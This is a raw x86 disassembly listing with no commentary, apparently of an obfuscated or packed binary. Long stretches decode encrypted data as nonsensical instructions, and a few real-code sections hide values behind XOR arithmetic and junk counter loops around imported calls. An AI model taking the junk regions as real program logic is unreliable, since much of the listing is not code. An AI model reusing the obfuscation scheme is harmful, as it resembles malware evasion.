  40a7dc:	idiv   DWORD PTR [edx-0x34]
  40a7df:	pop    esp
  40a7e0:	pop    esi
  40a7e1:	push   0x33e9796b
  40a7e6:	xor    BYTE PTR [eax-0x5e],0x5e
  40a7ea:	jo     0x40a821
  40a7ec:	jbe    0x40a827
  40a7ee:	jne    0x40a79d
  40a7f0:	ficomp WORD PTR [ecx]
  40a7f2:	sub    BYTE PTR [ecx+0x17],0x54
  40a7f6:	ins    BYTE PTR es:[edi],dx
  40a7f7:	rcl    al,0xcd
  40a7fa:	add    dl,BYTE PTR [ecx-0x34]
  40a7fd:	(bad)  
  40a7fe:	xchg   edx,eax
  40a7ff:	mov    al,0xb3
  40a801:	push   es
  40a802:	in     eax,0xd4
  40a804:	out    0x17,al
  40a806:	jno    0x40a78c
  40a808:	lods   al,BYTE PTR ds:[esi]
  40a809:	xor    DWORD PTR [ebp+0x66],0xffffff94
  40a80d:	jo     0x40a7a5
  40a80f:	leave  
  40a810:	fist   DWORD PTR [edx+0x4b]
  40a813:	jnp    0x40a869
  40a815:	int3   
  40a816:	scas   al,BYTE PTR es:[edi]
  40a817:	rdmsr  
  40a819:	dec    ebp
  40a81a:	cs xchg ebx,eax
  40a81c:	push   0xfea0daa3
  40a821:	icebp  
  40a822:	je     0x40a84f
  40a824:	pusha  
  40a825:	ja     0x40a844
  40a827:	sub    al,0x3a
  40a829:	mov    edi,0x639d4d59
  40a82e:	cmp    al,0xab
  40a830:	icebp  
  40a831:	ret    0xac5e
  40a834:	in     al,dx
  40a835:	pop    ss
  40a836:	mov    ds:0xd25ef5ef,al
  40a83b:	inc    ebx
  40a83c:	mov    bl,0xd0
  40a83e:	xchg   esp,eax
  40a83f:	leave  
  40a840:	or     DWORD PTR [edx],edi
  40a842:	inc    ebx
  40a843:	cwde   
  40a844:	adc    eax,0x8fc316ed
  40a849:	mov    esi,0x47d894df
  40a84e:	stos   DWORD PTR es:[edi],eax
  40a84f:	retf   
  40a850:	sbb    al,0xa4
  40a852:	and    DWORD PTR [edx+ebp*8-0x53],edi
  40a856:	push   ebp
  40a857:	push   0x60bd49c
  40a85c:	jnp    0x40a7e6
  40a85e:	jne    0x40a869
  40a860:	pop    esp
  40a861:	aad    0x53
  40a863:	popf   
  40a864:	mov    bl,0x42
  40a866:	adc    al,0xfb
  40a868:	scas   al,BYTE PTR es:[edi]
  40a869:	arpl   WORD PTR [ecx*1-0xbb30ee],cx
  40a870:	push   edi
  40a871:	call   0x92c3:0x2430ca29
  40a878:	inc    ecx
  40a879:	jbe    0x40a81f
  40a87b:	inc    esi
  40a87c:	jmp    0x1c3e:0x3bfb879b
  40a883:	jmp    0x88f4:0x94da3941
  40a88a:	xchg   edi,eax
  40a88b:	stos   DWORD PTR es:[edi],eax
  40a88c:	in     eax,0x8
  40a88e:	or     esi,DWORD PTR [ecx+0x16]
  40a891:	xchg   DWORD PTR [ebx+0x7b54c2ea],edx
  40a897:	cmc    
  40a898:	pop    es
  40a899:	lahf   
  40a89a:	cmp    al,0x2f
  40a89c:	shl    DWORD PTR [edi-0x70],0x3d
  40a8a0:	stc    
  40a8a1:	leave  
  40a8a2:	test   BYTE PTR [ebp+0xb503ff6],dh
  40a8a8:	sbb    eax,DWORD PTR [edi-0xb4525cc]
  40a8ae:	dec    ebx
  40a8af:	(bad)  
  40a8b0:	dec    esp
  40a8b1:	das    
  40a8b2:	jo     0x40a897
  40a8b4:	loop   0x40a86f
  40a8b6:	xchg   ebp,eax
  40a8b7:	aad    0x1
  40a8b9:	out    dx,eax
  40a8ba:	imul   esp,DWORD PTR [edi*1+0x785449af],0xc1519ac4
  40a8c5:	in     al,0xd2
  40a8c7:	jmp    0x6cfc:0xa8b2cc49
  40a8ce:	clc    
  40a8cf:	and    DWORD PTR [edx+0x9],esi
  40a8d2:	in     al,dx
  40a8d3:	cmp    ecx,DWORD PTR [edx-0x42]
  40a8d6:	outs   dx,BYTE PTR ds:[esi]
  40a8d7:	scas   eax,DWORD PTR es:[edi]
  40a8d8:	outs   dx,BYTE PTR ds:[esi]
  40a8d9:	mov    eax,0x26c7dfd7
  40a8de:	fnstcw WORD PTR ds:0xf29e2ed4
  40a8e4:	push   es
  40a8e5:	pushf  
  40a8e6:	lahf   
  40a8e7:	xor    BYTE PTR [edx-0x2f],cl
  40a8ea:	push   ss
  40a8eb:	nop
  40a8ec:	lds    ebx,FWORD PTR [esp+ebp*8]
  40a8ef:	xchg   edi,eax
  40a8f0:	sub    BYTE PTR ds:0x200f5618,ah
  40a8f6:	xchg   DWORD PTR [ecx+0x40],edi
  40a8f9:	es dec edx
  40a8fb:	cmp    bl,cl
  40a8fd:	and    dl,BYTE PTR [esi+0x564b588d]
  40a903:	mov    ecx,0xe46876a7
  40a908:	aad    0x39
  40a90a:	stos   DWORD PTR es:[edi],eax
  40a90b:	sub    al,BYTE PTR [ecx-0x4a]
  40a90e:	mov    ch,BYTE PTR [ebx+ecx*2+0x5bc8b790]
  40a915:	mov    ah,0x76
  40a917:	aaa    
  40a918:	lods   eax,DWORD PTR ds:[esi]
  40a919:	add    eax,0xc67bf5
  40a91e:	pop    ss
  40a91f:	loope  0x40a8b6
  40a921:	test   DWORD PTR [edi-0x65d9d2f1],ebx
  40a927:	dec    esp
  40a928:	pop    ecx
  40a929:	add    eax,0xdcd24ffc
  40a92e:	pop    edi
  40a92f:	ret    
  40a930:	inc    eax
  40a931:	arpl   WORD PTR [esi],dx
  40a933:	sti    
  40a934:	and    BYTE PTR [ebx+0x7b11f6d6],dl
  40a93a:	jmp    0xafd3:0xa294df8d
  40a941:	mov    esi,0xbf9761c7
  40a946:	pushf  
  40a947:	jb     0x40a97b
  40a949:	add    BYTE PTR [ebx],dl
  40a94b:	sbb    eax,0x432608
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432ce2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434321
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432ce2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432cca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4325fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4325fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4325fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4325fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4325fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432c12
  40a9bb:	cmp    DWORD PTR ds:0x4325fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4325fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4325fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4325f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4325f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4325f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4325f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4325f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432b62
  40aa39:	cmp    DWORD PTR ds:0x4325f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4325f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4325f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434276,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43427e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43427e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43427e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43427e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43427e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43265d
  40aaa8:	call   DWORD PTR ds:0x432c16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43426e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4342a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432cc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434292
  40aae3:	sbb    DWORD PTR ds:0x4325ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434319,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432ce2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434292,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x4d7cbad5
  40ab36:	lods   al,BYTE PTR ds:[esi]
  40ab37:	inc    esi
  40ab38:	fimul  WORD PTR [ebp+ebp*8+0x7f957070]
  40ab3f:	jo     0x40abb1
  40ab41:	or     cl,BYTE PTR [edi]
  40ab43:	loope  0x40aae8
  40ab45:	(bad)  
  40ab46:	dec    ebp
  40ab47:	daa    
  40ab48:	pop    esp
  40ab49:	repz adc al,0x90
  40ab4c:	add    ebx,DWORD PTR [eax+0x1c]
  40ab4f:	sbb    eax,0x81ed4cb0
  40ab54:	ins    DWORD PTR es:[edi],dx
  40ab55:	stc    
  40ab56:	loop   0x40aba3
  40ab58:	fldenv [eax]
  40ab5a:	repz je 0x40ab87
  40ab5d:	dec    ecx
  40ab5e:	fcomp  QWORD PTR [ecx-0x39]
  40ab61:	fild   DWORD PTR [edi+ebp*8+0x44]
  40ab65:	or     ah,BYTE PTR [ebx-0x67a9fb26]
  40ab6b:	push   ds
  40ab6c:	(bad)  
  40ab6d:	frstor [eax-0x58]
  40ab70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab71:	or     eax,0x56049c37
  40ab76:	(bad)
  40ab7a:	xor    DWORD PTR [edi],eax
  40ab7c:	cs dec esp
  40ab7e:	nop
  40ab7f:	mov    cl,0xf4
  40ab81:	dec    edi
  40ab82:	ja     0x40abf4
  40ab84:	loope  0x40ab13
  40ab86:	sub    eax,0x3e7f0180
  40ab8b:	push   ebp
  40ab8c:	lock push cs
  40ab8e:	test   BYTE PTR [edi+ebp*2-0x32],cl
  40ab92:	jle    0x40ac01
  40ab94:	(bad)  
  40ab95:	cdq    
  40ab96:	jnp    0x40ab44
  40ab98:	or     eax,0x84ba6334
  40ab9d:	dec    esp
  40ab9e:	inc    esp
  40ab9f:	push   ebp
  40aba0:	jp     0x40ab2f
  40aba2:	stc    
  40aba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba4:	push   ebx
  40aba5:	call   0xcd5d:0x2f21f4ee
  40abac:	push   eax
  40abad:	test   ebp,ecx
  40abaf:	dec    ebx
  40abb0:	hlt    
  40abb1:	stc    
  40abb2:	xlat   BYTE PTR ds:[ebx]
  40abb3:	pop    ecx
  40abb4:	xor    dh,bh
  40abb6:	pop    esp
  40abb7:	das    
  40abb8:	out    dx,eax
  40abb9:	adc    esp,edi
  40abbb:	sub    DWORD PTR [ebp-0x2b],0xffffffcb
  40abbf:	mov    cl,0x97
  40abc1:	in     al,0x93
  40abc3:	test   BYTE PTR [ecx-0x5c],0xeb
  40abc7:	jg     0x40ac0f
  40abc9:	sub    eax,0xa2d0a8b1
  40abce:	cmp    ebx,DWORD PTR [esi-0x72]
  40abd1:	hlt    
  40abd2:	adc    al,BYTE PTR [eax+0x68]
  40abd5:	sbb    eax,0x358408bf
  40abda:	test   eax,0xbef2253f
  40abdf:	pop    ebx
  40abe0:	dec    esp
  40abe1:	jmp    0x40ac20
  40abe3:	mov    ebx,edi
  40abe5:	div    BYTE PTR [ebp+eiz*8+0x45bba209]
  40abec:	int    0x3
  40abee:	out    0x81,al
  40abf0:	dec    eax
  40abf1:	ja     0x40ac1f
  40abf3:	lea    esi,[ebx+0x286fab85]
  40abf9:	fcomp  DWORD PTR [eax+0x3f]
  40abfc:	js     0x40ac27
  40abfe:	push   ebx
  40abff:	repz iret 
  40ac01:	push   eax
  40ac02:	cmp    edi,DWORD PTR [esi+0x68]
  40ac05:	add    ecx,DWORD PTR [edx+ebp*4-0x3d510d5d]
  40ac0c:	jne    0x40ac45
  40ac0e:	iret   
  40ac0f:	and    al,0xda
  40ac11:	cmp    ecx,eax
  40ac13:	jecxz  0x40abc4
  40ac15:	xor    BYTE PTR [ebp+0x4f],dl
  40ac18:	xor    eax,0xd5b93eeb
  40ac1d:	les    ecx,FWORD PTR [edx-0x33]
  40ac20:	out    dx,eax
  40ac21:	(bad)  
  40ac22:	std    
  40ac23:	jle    0x40ac6f
  40ac25:	mov    ch,0x74
  40ac27:	out    dx,al
  40ac28:	es pop esp
  40ac2a:	pushf  
  40ac2b:	fist   WORD PTR [edi]
  40ac2d:	bound  ebx,QWORD PTR [edi]
  40ac2f:	jo     0x40ac9a
  40ac31:	rol    BYTE PTR [esi+eiz*1+0x4552d55d],1
  40ac38:	mov    dl,0xb1
  40ac3a:	fld    TBYTE PTR [ebx-0x64c7ad7d]
  40ac40:	fwait
  40ac41:	and    eax,edi
  40ac43:	xor    al,0xf9
  40ac45:	loope  0x40acc1
  40ac47:	test   al,0xdb
  40ac49:	xchg   esi,eax
  40ac4a:	pop    ebx
  40ac4b:	popf   
  40ac4c:	bound  edi,QWORD PTR [edi+0x70]
  40ac4f:	jp     0x40acaa
  40ac51:	and    al,0xda
  40ac53:	call   0x5dc6:0x3baa593d
  40ac5a:	cmp    eax,0xaf3eefa5
  40ac5f:	iret   
  40ac60:	outs   dx,BYTE PTR ds:[esi]
  40ac61:	out    0x6f,al
  40ac63:	mov    esi,0x203d469d
  40ac68:	shr    DWORD PTR [esi-0x65e52494],0x64
  40ac6f:	jmp    0xaace3022
  40ac74:	idiv   BYTE PTR [ebx]
  40ac76:	into   
  40ac77:	stos   BYTE PTR es:[edi],al
  40ac78:	mov    eax,0xdf26205
  40ac7d:	xchg   ebx,eax
  40ac7e:	fwait
  40ac7f:	and    al,0x85
  40ac81:	mov    cl,bl
  40ac83:	lods   al,BYTE PTR ds:[esi]
  40ac84:	adc    bl,BYTE PTR [eax+0x6e32cf68]
  40ac8a:	jle    0x40aca4
  40ac8c:	jecxz  0x40ac7d
  40ac8e:	xchg   ebp,eax
  40ac8f:	outs   dx,BYTE PTR ds:[esi]
  40ac90:	loope  0x40ac62
  40ac92:	sbb    ch,BYTE PTR [ecx+edi*1]
  40ac95:	pop    eax
  40ac96:	inc    edi
  40ac97:	(bad)  
  40ac98:	(bad)  
  40ac99:	push   ss
  40ac9a:	fs adc eax,0x85d89d29
  40aca0:	adc    ah,BYTE PTR [edx+0x28]
  40aca3:	add    BYTE PTR [eax+0x23],cl
  40aca6:	push   ds
  40aca7:	mov    ah,0xb8
  40aca9:	adc    al,0xf7
  40acab:	dec    edx
  40acac:	ins    BYTE PTR es:[edi],dx
  40acad:	push   edx
  40acae:	mov    eax,ds:0x1232da79
  40acb3:	jb     0x40ac7f
  40acb5:	retf   0xbc2d
  40acb8:	hlt    
  40acb9:	(bad)  
  40acba:	mov    ds:0x350f13cd,al
  40acbf:	inc    ecx
  40acc0:	dec    eax
  40acc1:	lea    eax,[edi+eiz*1+0x36]
  40acc5:	bound  edx,QWORD PTR [ecx+0x62b2c4a5]
  40accb:	mov    dh,BYTE PTR [edi-0x696f2025]
  40acd1:	retf   
  40acd2:	test   al,0xd
  40acd4:	icebp  
  40acd5:	mov    ds:0x4b921c93,al
  40acda:	xchg   ah,dh
  40acdc:	mov    eax,DWORD PTR [ebp+0x8]
  40acdf:	mov    ecx,DWORD PTR [ebp-0x8]
  40ace2:	xor    eax,esi
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	mov    al,0xd5
  40ad46:	mov    al,0xe1
  40ad48:	and    ebx,ebp
  40ad4a:	jo     0x40adbc
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40ad71
  40ad51:	or     BYTE PTR [edi],bh
  40ad53:	cld    
  40ad54:	dec    eax
  40ad55:	push   ebx
  40ad56:	pop    edx
  40ad57:	stos   DWORD PTR es:[edi],eax
  40ad58:	mov    dh,0x73
  40ad5a:	pop    eax
  40ad5b:	push   eax
  40ad5c:	push   cs
  40ad5d:	jge    0x40ad39
  40ad5f:	cmp    DWORD PTR [edi],0x317811ac
  40ad65:	or     DWORD PTR [eax-0x46e042d3],edi
  40ad6b:	and    DWORD PTR [ebx],0xb6295093
  40ad71:	or     bh,BYTE PTR [ebp-0x7c]
  40ad74:	mov    esp,0x3fec8aa6
  40ad79:	and    eax,0xfbdee463
  40ad7e:	dec    BYTE PTR [edi-0x57]
  40ad81:	stos   BYTE PTR es:[edi],al
  40ad82:	xor    ah,dl
  40ad84:	push   ss
  40ad85:	inc    esi
  40ad86:	sbb    esi,DWORD PTR [ecx+0x10ed0d59]
  40ad8c:	pusha  
  40ad8d:	add    bh,ah
  40ad8f:	popa   
  40ad90:	imul   edx,DWORD PTR [edi+edx*2-0x5b],0x1568c83c
  40ad98:	and    al,0x61
  40ad9a:	fnstenv gs:[edi+0x54]
  40ad9e:	push   eax
  40ad9f:	cmc    
  40ada0:	sbb    edx,DWORD PTR [edx+0x6176ba14]
  40ada6:	pop    esi
  40ada7:	mov    ecx,0x70b2c861
  40adac:	es fcomi st,st(6)
  40adaf:	ret    0xe012
  40adb2:	mov    edx,DWORD PTR [ebp-0x2ae0e1e2]
  40adb8:	jo     0x40ad46
  40adba:	jne    0x40ade7
  40adbc:	xor    eax,DWORD PTR [ebx-0x74166a07]
  40adc2:	call   0x2ec7df42
  40adc7:	pop    ecx
  40adc8:	mov    cl,0xd6
  40adca:	test   al,0x64
  40adcc:	and    dl,BYTE PTR [eax]
  40adce:	or     esp,ecx
  40add0:	adc    bh,BYTE PTR [ecx]
  40add2:	(bad)  
  40add3:	pop    esp
  40add4:	sbb    al,0x43
  40add6:	(bad)  
  40add7:	xor    eax,esi
  40add9:	stos   DWORD PTR es:[edi],eax
  40adda:	jg     0x40ad9e
  40addc:	push   edx
  40addd:	xchg   edi,edi
  40addf:	push   es
  40ade0:	xor    al,0xcc
  40ade2:	bound  ecx,QWORD PTR [ebx+0x70f2b6ba]
  40ade8:	add    ebp,DWORD PTR [ebx+0x29]
  40adeb:	or     eax,edi
  40aded:	or     ebp,DWORD PTR [eax+edi*1+0x4cefeb79]
  40adf4:	les    edi,FWORD PTR [eax+ebx*1]
  40adf7:	mov    dl,0xe6
  40adf9:	lahf   
  40adfa:	shl    DWORD PTR [ebp+edi*1-0x6b4f81e8],cl
  40ae01:	es stos BYTE PTR es:[edi],al
  40ae03:	clc    
  40ae04:	int3   
  40ae05:	iret   
  40ae06:	xchg   ebx,eax
  40ae07:	pusha  
  40ae08:	fsubrp st(5),st
  40ae0a:	dec    esi
  40ae0b:	xchg   ebp,eax
  40ae0c:	add    DWORD PTR [esi+0x3f271a0b],ebx
  40ae12:	(bad)  
  40ae13:	jns    0x40aded
  40ae15:	jp     0x40ae66
  40ae17:	jmp    0x1389:0xc10f0a7b
  40ae1e:	les    ebx,FWORD PTR [edi-0x59]
  40ae21:	dec    esi
  40ae22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae23:	retf   
  40ae24:	clc    
  40ae25:	xor    BYTE PTR [eax+0x435115c2],dl
  40ae2b:	sbb    edx,DWORD PTR [ecx-0x3]
  40ae2e:	and    DWORD PTR [edx+0x18fb1258],eax
  40ae34:	pop    ss
  40ae35:	daa    
  40ae36:	mov    al,0x36
  40ae38:	pushf  
  40ae39:	jle    0x40ade9
  40ae3b:	ret    0xab02
  40ae3e:	dec    ebp
  40ae3f:	add    BYTE PTR [eax],cl
  40ae41:	stos   DWORD PTR es:[edi],eax
  40ae42:	pusha  
  40ae43:	inc    ecx
  40ae44:	addr16 lock inc esp
  40ae47:	pop    ss
  40ae48:	xor    esi,ebp
  40ae4a:	jge    0x40ae2b
  40ae4c:	in     al,0x91
  40ae4e:	mov    cl,cl
  40ae50:	pushf  
  40ae51:	test   al,0x63
  40ae53:	mov    edx,ebx
  40ae55:	inc    BYTE PTR [ebx+0x54dab54b]
  40ae5b:	pop    ds
  40ae5c:	jp     0x40ae7c
  40ae5e:	adc    dh,BYTE PTR [eax]
  40ae60:	jg     0x40ae98
  40ae62:	test   DWORD PTR [edi+0x7f],0x32032416
  40ae69:	push   0xb75479e8
  40ae6e:	sub    eax,0x45e1be3a
  40ae73:	push   esi
  40ae74:	pop    es
  40ae75:	es in  eax,0xc8
  40ae78:	dec    eax
  40ae79:	fs lock jns 0x40aee9
  40ae7d:	xchg   esi,eax
  40ae7e:	ins    BYTE PTR es:[di],dx
  40ae80:	mov    eax,ds:0x76d9f959
  40ae85:	jmp    0xef4a48e1
  40ae8a:	mov    dh,0xc9
  40ae8c:	pusha  
  40ae8d:	sbb    edi,0x979b6bb3
  40ae93:	adc    al,0x74
  40ae95:	mov    eax,ds:0xb43c267d
  40ae9a:	pop    ebx
  40ae9b:	jle    0x40ae20
  40ae9d:	add    al,0x1a
  40ae9f:	pop    esp
  40aea0:	retf   
  40aea1:	pop    ss
  40aea2:	dec    ebx
  40aea3:	and    eax,0xc2ad5f32
  40aea8:	and    eax,0xb981e6af
  40aead:	fld    QWORD PTR [esi]
  40aeaf:	lods   eax,DWORD PTR ds:[esi]
  40aeb0:	xchg   esi,eax
  40aeb1:	lahf   
  40aeb2:	sub    DWORD PTR [edx-0x5cb0e72d],esp
  40aeb8:	sbb    DWORD PTR [eax+0x7d],edi
  40aebb:	add    BYTE PTR [ebp-0x46],ch
  40aebe:	xchg   ebx,eax
  40aebf:	scas   al,BYTE PTR es:[edi]
  40aec0:	fs loope 0x40af23
  40aec3:	int    0x94
  40aec5:	clc    
  40aec6:	mov    edi,0xcd8b1620
  40aecb:	mov    eax,ds:0x4c47da45
  40aed0:	push   cs
  40aed1:	test   BYTE PTR [eax],ch
  40aed3:	inc    ebx
  40aed4:	fcom   st(6)
  40aed6:	out    0x8a,eax
  40aed8:	pop    esp
  40aed9:	imul   BYTE PTR [eax]
  40aedb:	mov    edx,0xebd64a1e
  40aee0:	pushf  
  40aee1:	push   edx
  40aee2:	add    edx,DWORD PTR [ebx]
  40aee4:	xchg   DWORD PTR [esp+eax*1-0x11],ebp
  40aee8:	push   edi
  40aee9:	sbb    cl,BYTE PTR [edx-0x75]
  40aeec:	dec    ebp
  40aeed:	or     al,0x33
  40aeef:	(bad)  
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	in     eax,0xe3
  40af6b:	cmp    eax,0x70ea465e
  40af70:	jo     0x40af07
  40af72:	jg     0x40afe4
  40af74:	jo     0x40af6d
  40af76:	fs inc ebp
  40af78:	or     al,0xc7
  40af7a:	loop   0x40afa2
  40af7c:	in     al,0xbe
  40af7e:	xor    DWORD PTR [edx],eax
  40af80:	cdq    
  40af81:	inc    edi
  40af82:	call   0xa7ef:0x4a69234b
  40af89:	sti    
  40af8a:	mov    al,0x87
  40af8c:	pop    ebx
  40af8d:	xchg   edx,eax
  40af8e:	sbb    al,0x60
  40af90:	mov    ebp,0x5ed5d629
  40af95:	sub    bh,BYTE PTR [eax-0x37a756d9]
  40af9b:	imul   eax,DWORD PTR [esi-0x59de4927],0xffffffa3
  40afa2:	adc    DWORD PTR [esp+ebx*2+0x3],ebx
  40afa6:	mov    bh,0xa6
  40afa8:	jo     0x40b013
  40afaa:	out    0x91,al
  40afac:	fcmovnb st,st(6)
  40afae:	inc    esi
  40afaf:	inc    eax
  40afb0:	or     dh,bh
  40afb2:	neg    BYTE PTR [esi]
  40afb4:	xchg   BYTE PTR [ecx],al
  40afb6:	inc    ecx
  40afb7:	dec    ebx
  40afb8:	push   0x5fb72f74
  40afbd:	mov    ebx,0xb8b6196c
  40afc2:	lahf   
  40afc3:	(bad)  
  40afc4:	jmp    0x40af6b
  40afc6:	or     bh,cl
  40afc8:	mov    ch,0xa6
  40afca:	inc    esp
  40afcb:	xchg   si,ax
  40afcd:	stos   DWORD PTR es:[edi],eax
  40afce:	xor    cl,BYTE PTR [ebp+eiz*2+0x2aee3175]
  40afd5:	(bad)  
  40afd6:	cli    
  40afd7:	dec    ecx
  40afd8:	push   eax
  40afd9:	sub    DWORD PTR [edx-0x7f],esi
  40afdc:	adc    al,bh
  40afde:	xor    bl,bl
  40afe0:	div    DWORD PTR [eax+edx*8+0x2f8b7528]
  40afe7:	add    BYTE PTR [esi],0x5a
  40afea:	mov    eax,ds:0x3b41398
  40afef:	jle    0x40afa6
  40aff1:	xchg   ebx,eax
  40aff2:	repnz aad 0x20
  40aff5:	(bad)  
  40aff6:	fsubr  QWORD PTR [ebp+0x54]
  40aff9:	lahf   
  40affa:	pop    ebx
  40affb:	and    DWORD PTR [edx+0x7a8866c6],esp
  40b001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b002:	jle    0x40b076
  40b004:	ins    BYTE PTR es:[edi],dx
  40b005:	pop    ebx
  40b006:	mov    esp,0x7163119a
